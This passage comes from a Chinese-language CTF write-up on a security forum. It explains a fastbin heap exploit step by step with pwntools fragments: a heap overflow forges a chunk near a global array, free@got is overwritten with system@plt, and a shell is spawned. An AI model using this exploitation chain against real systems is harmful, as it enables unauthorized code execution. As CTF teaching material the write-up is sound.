
```
payload = b'a'*0x68 + p64(0x71) + p64(0x6020ad)
fill(0,payload)
```

接着我们就要覆盖`chunk1`的`fd`指针，使其指向bss段，为什么`fd`指针要设为`0x6020ad`呢，我们伪造chunk的目的是为了能够修改`heaparray`的数组元素，那伪造的chunk自然是要在`heaparray`数组的低地址方向了，可以看到这里`magic`和`heaparray`两个变量的地址相差`0x20`

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1002337_CT46WSSN32F7HJJ.webp)

因为fastbin会对chunk的`size`检查，我们可以把`0x7f`当成chunk的`size`，也就是`0x60`大小，能够覆盖`heaparray`的内容

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1002337_S4A8CQ5KU87KUFM.webp)

这个地址是`0x6020b5`，但是`fd`指针指向的是chunk的首地址，因此还要减去`0x8`，也就得到了`0x6020ad`

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1002337_33JHRXA3PJ3N3TP.webp)

把`fd`指针指向了我们想要的地址

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1002337_SJH45TCHADFSRBB.webp)

```
allocate(0x60,b'/bin/sh\x00')
payload = b'a'*0x23 + p64(elf.got["free"])
allocate(0x60,payload)
```

接着我们两个`malloc`，分别得到`chunk1`和freak chunk，数组下标分别是`1`和`2`，使得`cunk1`的内容是`/bin/sh\x00`，再修改freak chunk使得`heaparray[0]`的内容是`free@got`

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1002337_WRXDMWPBV4T2CP5.webp)

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1002337_TYMDSKPPJ6Q722C.webp)

```
payload = p64(elf.plt["system"])
fill(0,payload)
```

既然`heaparray[0]`已经被我们修改为`free@got`地址了，那我们可以`edit_heap`使得该地址内容为`system@plt`，才可以在调用`free`函数的时候，反而调用的是`system`函数

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1002337_XF77SPCY7UJFN77.webp)

```
free(1)
io.interactive()
```

最后就是顺理成章，得到shell了

![图片描述](https://bbs.kanxue.com/upload/attach/202511/1002337_A32MMGD86QYBQ2U.webp)

# 6.参考

参考链接：8c7K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8X3u0D9L8$3N6K6i4K6u0W2j5$3!0E0i4K6u0r3K9r3q4H3M7s2W2F1L8%4W2Q4x3V1k6H3i4K6u0r3x3e0j5J5y4K6l9I4y4e0S2Q4x3X3g2Z5N6r3#2D9

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2025-11-26 14:56 被 G0t1T 编辑，原因：补充内容

[#溢出](https://bbs.kanxue.com/forum-171-1-182.htm)

[#题解集锦](https://bbs.kanxue.com/forum-171-1-187.htm)
